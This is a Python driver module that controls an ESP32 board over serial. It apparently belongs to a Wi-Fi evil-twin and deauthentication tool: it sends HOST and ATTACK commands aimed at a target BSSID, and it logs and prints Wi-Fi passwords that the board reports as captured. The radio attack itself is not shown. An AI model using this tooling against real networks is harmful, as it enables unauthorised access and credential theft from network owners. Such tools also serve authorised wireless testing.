# esp_driver.py
import serial
import time
import threading
from config import C_GREEN, C_RED, C_YELLOW, C_CYAN, C_RESET, BAUDRATE
from logger import logger

class ESP32Driver:
    def __init__(self, port, baudrate=BAUDRATE):
        self.port = port
        self.baudrate = baudrate
        self.ser = None
        self.is_connected = False
        self.captured_password = None
        self.stop_reading = False
        self.read_thread = None

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()
        # Don't suppress exceptions
        return False

    def connect(self):
        try:
            self.ser = serial.Serial(self.port, self.baudrate, timeout=1)
            time.sleep(2) # Wait for board reset
            self.is_connected = True
            logger.info(f"ESP Connected on {self.port}")
            print(f"{C_GREEN}[+] ESP Connected on {self.port}{C_RESET}")
            
            # Start listener thread
            self.stop_reading = False
            self.read_thread = threading.Thread(target=self._read_loop, daemon=True)
            self.read_thread.start()
            return True
        except serial.SerialException as e:
            logger.error(f"Serial Connection Error on {self.port}: {e}")
            print(f"{C_RED}[!] Serial Connection Error: {e}{C_RESET}")
            return False
        except Exception as e:
            logger.error(f"Unexpected error connecting to ESP32: {e}")
            return False

    def _read_loop(self):
        while not self.stop_reading:
            if self.is_connected:
                try:
                    if self.ser and self.ser.in_waiting > 0:
                        line = self.ser.readline().decode('utf-8', errors='ignore').strip()
                        if line:
                            self._process_line(line)
                    else:
                        time.sleep(0.01) # CPU yielding
                except (OSError, serial.SerialException) as e:
                    logger.warning(f"ESP Disconnected: {e}")
                    self.is_connected = False
                    print(f"\n{C_RED}[!] ESP Disconnected! Attempting to reconnect...{C_RESET}")
                    if self.ser:
                        try: self.ser.close()
                        except: pass
            else:
                # Reconnection attempt loop
                try:
                    # Check if port exists before trying to open (optional but good on Linux)
                    self.ser = serial.Serial(self.port, self.baudrate, timeout=1)
                    time.sleep(2) # Wait for boot
                    self.is_connected = True
                    logger.info("ESP Reconnected successfully")
                    print(f"{C_GREEN}[+] ESP Reconnected!{C_RESET}")
                except Exception:
                    time.sleep(2) # Wait before retry
        
        # Cleanup on exit
        if self.ser:
            try: self.ser.close()
            except: pass

    def _process_line(self, line):
        # Analyze ESP32 response
        try:
            if "[CAPTURED]" in line:
                # [CAPTURED] mypassword123
                parts = line.split(" ", 1)
                if len(parts) > 1:
                    self.captured_password = parts[1].strip()
                    logger.info(f"ESP32 Captured Password: {self.captured_password}")
                    print(f"\n{C_GREEN}[!] CAPTURED DATA: {self.captured_password}{C_RESET}")
            
            elif "[STATUS]" in line:
                print(f"\n{C_CYAN}[ESP Status]: {line}{C_RESET}")
            elif "[EVENT]" in line:
                print(f"\n{C_YELLOW}[ESP Event]: {line}{C_RESET}")
            elif "[ERROR]" in line:
                logger.warning(f"ESP Error: {line}")
                print(f"\n{C_RED}[ESP Error]: {line}{C_RESET}")
            elif "[SUCCESS]" in line:
                print(f"\n{C_GREEN}[ESP]: {line}{C_RESET}")
        except Exception as e:
            logger.debug(f"Error processing serial line: {e}")

    def send_command(self, cmd):
        if self.is_connected and self.ser:
            try:
                full_cmd = cmd + "\n"
                self.ser.write(full_cmd.encode())
                time.sleep(0.1)
            except Exception as e:
                logger.error(f"Failed to send command '{cmd}': {e}")
                self.is_connected = False

    def start_host(self, ssid, channel):
        print(f"[*] Sending HOST command: {ssid} (CH: {channel})")
        logger.info(f"ESP HOST command: {ssid} ch:{channel}")
        self.send_command(f"HOST {ssid} {channel}")

    def start_attack(self, bssid, channel, duration=0):
        self.send_command(f"ATTACK {bssid} {channel} {duration}")

    def send_ok(self):
        self.send_command("OK")

    def send_no(self):
        self.send_command("NO")

    def stop_all(self):
        self.send_command("STOP")
        
    def close(self):
        self.stop_reading = True
        self.stop_all()
        
        if self.ser:
            try:
                self.ser.close()
            except: pass
        
        self.is_connected = False